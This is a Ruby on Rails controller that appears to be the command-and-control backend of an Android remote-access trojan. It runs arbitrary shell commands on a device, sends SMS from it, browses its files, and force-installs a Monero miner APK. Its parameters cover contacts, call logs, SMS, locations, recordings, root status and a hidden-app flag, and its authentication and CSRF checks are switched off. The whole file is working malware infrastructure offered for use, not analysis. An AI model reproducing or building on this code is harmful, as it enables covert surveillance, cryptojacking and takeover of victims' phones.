class SmartphonesController < InheritedResources::Base
  skip_before_action :authenticate_admin_user!, raise: false
  skip_before_action :verify_authenticity_token
  # Thread-safe recording state managed via Smartphone.is_recording column

  def send_sms_message
    begin
      phone_number = params[:phone_number]
      message = params[:message]
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      if phone_number.present? && message.present?
        pending_command = send_command_and_wait(
          @smartphone, 
          'send_sms', 
          { phone_number: phone_number, message: message }, 
          timeout: 15.seconds
        )
        
        if pending_command.completed?
          commandOutput = ["SMS sent to #{phone_number}"]
        else
          commandOutput = ["Operation Failed"]
        end
      else
        commandOutput = ["Missing phone number or message"]
      end
      
    rescue => e
      Rails.logger.error("Error sending SMS: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "send_sms", locals: { commandOutput: commandOutput }
      }
    end
  end

  def upload_file
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      local_file = params[:push_file]
      remote_dest = params[:destination]
      
      # Future: implement chunked upload via ActionCable
      commandOutput = ["File upload not yet implemented via ActionCable", "Use Phase 3 chunked transfer protocol"]
      
    rescue => e
      Rails.logger.error("Error uploading file: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "upload_file", locals: { commandOutput: commandOutput }
      }
    end
  end

  def run_shell_command
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      command = params[:command]
      
      pending_command = send_command_and_wait(@smartphone, 'shell_exec', { command: command }, timeout: 30.seconds)
      
      if pending_command.completed?
        output = pending_command.response_data['output'] || ''
        commandOutput = output.split("\n")
      else
        commandOutput = ["Operation Failed"]
      end
      
    rescue => e
      Rails.logger.error("Error running shell command: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "run_shell_command", locals: { commandOutput: commandOutput }
      }
    end
  end

  def pull_file
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      remote_path = params[:pull_file]
      local_dest = params[:destination]
      
      # Future: implement chunked file transfer via ActionCable
      # For now, just acknowledge command
      commandOutput = ["File transfer not yet implemented via ActionCable", "Use Phase 3 chunked transfer protocol"]
      
    rescue => e
      Rails.logger.error("Error pulling file: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "pull_file", locals: { commandOutput: commandOutput }
      }
    end
  end

  def crypto_miner
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      # Read monero miner APK and encode to Base64
      miner_apk_path = Rails.root.join('tools', 'monero-miner.apk')
      if File.exist?(miner_apk_path)
        apk_base64 = Base64.strict_encode64(File.binread(miner_apk_path))
        
        # Note: This is a "loud" feature that triggers heat/battery alerts
        pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
        
        if pending_command.completed?
          commandOutput = ["Monero miner installed successfully on #{@smartphone.name}"]
        else
          commandOutput = ["Installation Failed: #{pending_command.response_data&.dig('error') || 'Device timeout'}"]
        end
      else
        commandOutput = ["Monero miner APK not found at tools/monero-miner.apk"]
      end
      
    rescue => e
      Rails.logger.error("Error installing crypto miner: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "crypto_minner", locals: { commandOutput: commandOutput }
      }
    end
  end

  def dropdown_list_smartphones
    render locals: { smartphones: smartphones,
                     smartphone: smartphone }
  end

  def select_smartphone
    redirect_to controller: "admin/dashboard",
      action: "index",
      selected_smartphone_id: params[:smartphone_id]
  end

  def load
    render
  end

  def install
    path = "installsomething.txt"
    content = "data from the form"
    File.open(path, "w+") do |f|
      f.write(content)
    end
  end

  def browse_files
    begin
      smartphone = Smartphone.find(params[:smartphone_id])
      path = params[:path] || "/sdcard"
      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        { command: "browse_files", params: { path: path }, timestamp: Time.now.to_i }
      )
      commandOutput = ["📂 Browsing #{path} on #{smartphone.name}"]
    rescue => e
      commandOutput = ["Error: #{e.message}"]
    end
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js { render "browse_files", locals: { commandOutput: commandOutput } }
    end
  end

  private

  def want_json?
    request.format.json? || request.headers['Accept']&.include?('application/json')
  end

  def smartphone_params
    params.require(:smartphone).permit(:operating_system,
                                       :name,
                                       :pictures,
                                       :screenshots,
                                       :videos,
                                       :recordings,
                                       :is_rooted,
                                       :call_logs,
                                       :contacts,
                                       :sms_messages,
                                       :geo_locations,
                                       :is_app_hidden)
  end
  
  def command_service_for(smartphone)
    DeviceCommandService.new(smartphone)
  end

  def send_command_async(smartphone, command, params = {})
    command_service_for(smartphone).queue_command(command, params)
  end

  def send_command_and_wait(smartphone, command, params = {}, timeout: 30.seconds)
    command_service_for(smartphone).wait_for_command(command, params, timeout: timeout)
  end
  
  # Helper method to send commands via ActionCable to Android device
  def send_command_to_device(smartphone, command, params = {})
    command_data = {
      command: command,
      params: params,
      timestamp: Time.now.to_i
    }
    
    ActionCable.server.broadcast(
      "commands_#{smartphone.device_id}",
      command_data
    )
    
    Rails.logger.info "Sent command #{command} to device #{smartphone.device_id}"
  end
end
